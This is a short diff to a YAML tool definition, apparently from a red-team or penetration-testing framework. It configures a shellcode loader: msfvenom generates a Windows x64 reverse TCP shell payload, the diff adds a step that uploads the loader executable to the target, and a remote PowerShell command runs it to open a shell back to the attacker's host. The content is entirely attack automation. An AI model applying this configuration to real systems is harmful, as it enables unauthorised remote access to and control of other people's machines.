@@ -19,4 +19,5 @@ tool:
   install_path: external/.exploit/gomulti_loader
   install_command: make windows
   execute_command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_windows.txt ; cp loader_windows.exe ../../../sessions/
+  upload_file: no_priv ./external/.exploit/cgoblin/loader_windows.exe
   remote_command: no_priv powershell .\loader_windows.exe -shellcode shellcode_windows.txt
